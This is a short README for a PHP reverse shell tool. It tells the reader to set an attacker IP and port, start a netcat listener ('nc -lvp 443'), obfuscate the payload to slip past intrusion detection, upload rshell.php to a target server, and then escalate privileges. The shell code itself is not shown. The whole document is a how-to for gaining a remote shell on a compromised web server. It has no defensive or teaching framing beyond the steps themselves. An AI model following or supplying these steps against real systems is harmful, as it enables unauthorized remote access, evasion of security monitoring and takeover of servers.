# php-reverse-shell
make a php call home with netcat (i.e. a php reverse shell)

## step 1 change code 
    $ip = '127.0.0.1';  // CHANGE THIS
    $port = 443;       // CHANGE THIS

## step 2 set your caller
    nc -lvp 443
## optional step: (in case you signal an IDS / IPS) -> Obfuscate!
use http://www.fopo.com.ar/

## step 3 upload rshell.php and run it
![scrn](https://i.imgur.com/j3Lsy3R.png)

## step 4 escalate ;)
![scrn](https://i.imgur.com/w02EgM8.jpg)
